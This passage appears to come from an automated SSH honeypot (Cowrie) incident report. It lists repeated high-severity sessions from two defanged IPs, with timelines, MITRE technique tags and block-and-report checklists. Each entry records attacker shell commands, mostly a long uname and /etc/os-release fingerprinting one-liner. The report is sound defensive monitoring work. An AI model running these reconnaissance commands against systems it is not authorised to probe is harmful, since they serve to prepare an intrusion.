| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.success` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:52` | `cowrie.command.input` |
| `2026-09-05 17:18:53` | `cowrie.log.closed` |
| `2026-09-05 17:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f817cc8ca762

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:22 |
| **Last Seen** | 2026-09-05 17:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:22:37` | `cowrie.session.connect` |
| `2026-09-05 17:22:38` | `cowrie.client.version` |
| `2026-09-05 17:22:38` | `cowrie.client.kex` |
| `2026-09-05 17:22:43` | `cowrie.login.success` |
| `2026-09-05 17:22:44` | `cowrie.session.params` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.success` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:44` | `cowrie.command.input` |
| `2026-09-05 17:22:45` | `cowrie.log.closed` |
| `2026-09-05 17:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78243d4d0d0c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:25 |
| **Last Seen** | 2026-09-05 17:25 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:25:37` | `cowrie.session.connect` |
| `2026-09-05 17:25:41` | `cowrie.client.version` |
| `2026-09-05 17:25:41` | `cowrie.client.kex` |
| `2026-09-05 17:25:44` | `cowrie.login.success` |
| `2026-09-05 17:25:48` | `cowrie.session.params` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.success` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:48` | `cowrie.command.input` |
| `2026-09-05 17:25:50` | `cowrie.log.closed` |
| `2026-09-05 17:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c327aa684b8a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:28 |
| **Last Seen** | 2026-09-05 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:28:03` | `cowrie.session.connect` |
| `2026-09-05 17:28:03` | `cowrie.client.version` |
| `2026-09-05 17:28:03` | `cowrie.client.kex` |
| `2026-09-05 17:28:04` | `cowrie.login.success` |
| `2026-09-05 17:28:04` | `cowrie.session.params` |
| `2026-09-05 17:28:04` | `cowrie.command.input` |
| `2026-09-05 17:28:05` | `cowrie.log.closed` |
| `2026-09-05 17:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7fde63bc9eb

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:28 |
| **Last Seen** | 2026-09-05 17:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:28:19` | `cowrie.session.connect` |
| `2026-09-05 17:28:19` | `cowrie.client.version` |
| `2026-09-05 17:28:20` | `cowrie.client.kex` |
| `2026-09-05 17:28:20` | `cowrie.login.success` |
| `2026-09-05 17:28:20` | `cowrie.session.params` |
| `2026-09-05 17:28:20` | `cowrie.command.input` |
| `2026-09-05 17:28:20` | `cowrie.log.closed` |
| `2026-09-05 17:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c62ab9089d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:28 |
| **Last Seen** | 2026-09-05 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:28:35` | `cowrie.session.connect` |
| `2026-09-05 17:28:35` | `cowrie.client.version` |
| `2026-09-05 17:28:35` | `cowrie.client.kex` |
| `2026-09-05 17:28:35` | `cowrie.login.success` |
| `2026-09-05 17:28:36` | `cowrie.session.params` |
| `2026-09-05 17:28:36` | `cowrie.command.input` |
| `2026-09-05 17:28:36` | `cowrie.log.closed` |
| `2026-09-05 17:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65405046517

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:28 |
| **Last Seen** | 2026-09-05 17:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:28:50` | `cowrie.session.connect` |
| `2026-09-05 17:28:50` | `cowrie.client.version` |
| `2026-09-05 17:28:50` | `cowrie.client.kex` |
| `2026-09-05 17:28:50` | `cowrie.login.success` |
| `2026-09-05 17:28:51` | `cowrie.session.params` |
| `2026-09-05 17:28:51` | `cowrie.command.input` |
| `2026-09-05 17:28:51` | `cowrie.log.closed` |
| `2026-09-05 17:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56bdafc47b6c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 17:29 |
| **Last Seen** | 2026-09-05 17:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:29:04` | `cowrie.session.connect` |
| `2026-09-05 17:29:05` | `cowrie.client.version` |
| `2026-09-05 17:29:05` | `cowrie.client.kex` |
| `2026-09-05 17:29:10` | `cowrie.login.success` |
| `2026-09-05 17:29:12` | `cowrie.session.params` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.success` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:12` | `cowrie.command.input` |
| `2026-09-05 17:29:14` | `cowrie.log.closed` |
| `2026-09-05 17:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-006aaf908216

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:29 |
| **Last Seen** | 2026-09-05 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:29:04` | `cowrie.session.connect` |
| `2026-09-05 17:29:04` | `cowrie.client.version` |
| `2026-09-05 17:29:04` | `cowrie.client.kex` |
| `2026-09-05 17:29:04` | `cowrie.login.success` |
| `2026-09-05 17:29:05` | `cowrie.session.params` |
| `2026-09-05 17:29:05` | `cowrie.command.input` |
| `2026-09-05 17:29:05` | `cowrie.log.closed` |
| `2026-09-05 17:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762be0fa2a7e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:29 |
| **Last Seen** | 2026-09-05 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:29:19` | `cowrie.session.connect` |
| `2026-09-05 17:29:19` | `cowrie.client.version` |
| `2026-09-05 17:29:19` | `cowrie.client.kex` |
| `2026-09-05 17:29:19` | `cowrie.login.success` |
| `2026-09-05 17:29:19` | `cowrie.session.params` |
| `2026-09-05 17:29:19` | `cowrie.command.input` |
| `2026-09-05 17:29:19` | `cowrie.log.closed` |
| `2026-09-05 17:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734df24cef29

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:29 |
| **Last Seen** | 2026-09-05 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:29:33` | `cowrie.session.connect` |
| `2026-09-05 17:29:33` | `cowrie.client.version` |
| `2026-09-05 17:29:33` | `cowrie.client.kex` |
| `2026-09-05 17:29:33` | `cowrie.login.success` |
| `2026-09-05 17:29:34` | `cowrie.session.params` |
| `2026-09-05 17:29:34` | `cowrie.command.input` |
| `2026-09-05 17:29:34` | `cowrie.log.closed` |
| `2026-09-05 17:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c2dbeef876

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:29 |
| **Last Seen** | 2026-09-05 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:29:48` | `cowrie.session.connect` |
| `2026-09-05 17:29:48` | `cowrie.client.version` |
| `2026-09-05 17:29:48` | `cowrie.client.kex` |
| `2026-09-05 17:29:48` | `cowrie.login.success` |
| `2026-09-05 17:29:48` | `cowrie.session.params` |
| `2026-09-05 17:29:48` | `cowrie.command.input` |
| `2026-09-05 17:29:48` | `cowrie.log.closed` |
| `2026-09-05 17:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10731b183423

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:30 |
| **Last Seen** | 2026-09-05 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:30:02` | `cowrie.session.connect` |
| `2026-09-05 17:30:02` | `cowrie.client.version` |
| `2026-09-05 17:30:02` | `cowrie.client.kex` |
| `2026-09-05 17:30:02` | `cowrie.login.success` |
| `2026-09-05 17:30:03` | `cowrie.session.params` |
| `2026-09-05 17:30:03` | `cowrie.command.input` |
| `2026-09-05 17:30:03` | `cowrie.log.closed` |
| `2026-09-05 17:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db4ece5747d9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:30 |
| **Last Seen** | 2026-09-05 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:30:17` | `cowrie.session.connect` |
| `2026-09-05 17:30:17` | `cowrie.client.version` |
| `2026-09-05 17:30:17` | `cowrie.client.kex` |
| `2026-09-05 17:30:17` | `cowrie.login.success` |
| `2026-09-05 17:30:17` | `cowrie.session.params` |
| `2026-09-05 17:30:17` | `cowrie.command.input` |
| `2026-09-05 17:30:17` | `cowrie.log.closed` |
| `2026-09-05 17:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbad0d0d15ee

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:30 |
| **Last Seen** | 2026-09-05 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:30:31` | `cowrie.session.connect` |
| `2026-09-05 17:30:31` | `cowrie.client.version` |
| `2026-09-05 17:30:31` | `cowrie.client.kex` |
| `2026-09-05 17:30:31` | `cowrie.login.success` |
| `2026-09-05 17:30:32` | `cowrie.session.params` |
| `2026-09-05 17:30:32` | `cowrie.command.input` |
| `2026-09-05 17:30:32` | `cowrie.log.closed` |
| `2026-09-05 17:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0abac58540

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:30 |
| **Last Seen** | 2026-09-05 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:30:45` | `cowrie.session.connect` |
| `2026-09-05 17:30:45` | `cowrie.client.version` |
| `2026-09-05 17:30:45` | `cowrie.client.kex` |
| `2026-09-05 17:30:45` | `cowrie.login.success` |
| `2026-09-05 17:30:46` | `cowrie.session.params` |
| `2026-09-05 17:30:46` | `cowrie.command.input` |
| `2026-09-05 17:30:46` | `cowrie.log.closed` |
| `2026-09-05 17:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063924d6b4aa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:30 |
| **Last Seen** | 2026-09-05 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:30:59` | `cowrie.session.connect` |
| `2026-09-05 17:30:59` | `cowrie.client.version` |
| `2026-09-05 17:30:59` | `cowrie.client.kex` |
| `2026-09-05 17:30:59` | `cowrie.login.success` |
| `2026-09-05 17:31:00` | `cowrie.session.params` |
| `2026-09-05 17:31:00` | `cowrie.command.input` |
| `2026-09-05 17:31:00` | `cowrie.log.closed` |
| `2026-09-05 17:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa1b40362df6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:31 |
| **Last Seen** | 2026-09-05 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:31:13` | `cowrie.session.connect` |
| `2026-09-05 17:31:13` | `cowrie.client.version` |
| `2026-09-05 17:31:13` | `cowrie.client.kex` |
| `2026-09-05 17:31:13` | `cowrie.login.success` |
| `2026-09-05 17:31:14` | `cowrie.session.params` |
| `2026-09-05 17:31:14` | `cowrie.command.input` |
| `2026-09-05 17:31:14` | `cowrie.log.closed` |
| `2026-09-05 17:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9dea6fb207

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:31 |
| **Last Seen** | 2026-09-05 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:31:27` | `cowrie.session.connect` |
| `2026-09-05 17:31:27` | `cowrie.client.version` |
| `2026-09-05 17:31:27` | `cowrie.client.kex` |
| `2026-09-05 17:31:27` | `cowrie.login.success` |
| `2026-09-05 17:31:27` | `cowrie.session.params` |
| `2026-09-05 17:31:27` | `cowrie.command.input` |
| `2026-09-05 17:31:27` | `cowrie.log.closed` |
| `2026-09-05 17:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c8bf4e974f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:31 |
| **Last Seen** | 2026-09-05 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:31:41` | `cowrie.session.connect` |
| `2026-09-05 17:31:41` | `cowrie.client.version` |
| `2026-09-05 17:31:41` | `cowrie.client.kex` |
| `2026-09-05 17:31:41` | `cowrie.login.success` |
| `2026-09-05 17:31:42` | `cowrie.session.params` |
| `2026-09-05 17:31:42` | `cowrie.command.input` |
| `2026-09-05 17:31:42` | `cowrie.log.closed` |
| `2026-09-05 17:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ada356a493

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:31 |
| **Last Seen** | 2026-09-05 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:31:55` | `cowrie.session.connect` |
| `2026-09-05 17:31:55` | `cowrie.client.version` |
| `2026-09-05 17:31:55` | `cowrie.client.kex` |
| `2026-09-05 17:31:55` | `cowrie.login.success` |
| `2026-09-05 17:31:55` | `cowrie.session.params` |
| `2026-09-05 17:31:55` | `cowrie.command.input` |
| `2026-09-05 17:31:55` | `cowrie.log.closed` |
| `2026-09-05 17:31:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb802254d81

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:32 |
| **Last Seen** | 2026-09-05 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:32:09` | `cowrie.session.connect` |
| `2026-09-05 17:32:09` | `cowrie.client.version` |
| `2026-09-05 17:32:09` | `cowrie.client.kex` |
| `2026-09-05 17:32:09` | `cowrie.login.success` |
| `2026-09-05 17:32:10` | `cowrie.session.params` |
| `2026-09-05 17:32:10` | `cowrie.command.input` |
| `2026-09-05 17:32:10` | `cowrie.log.closed` |
| `2026-09-05 17:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2fd0d3bbf7d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:32 |
| **Last Seen** | 2026-09-05 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
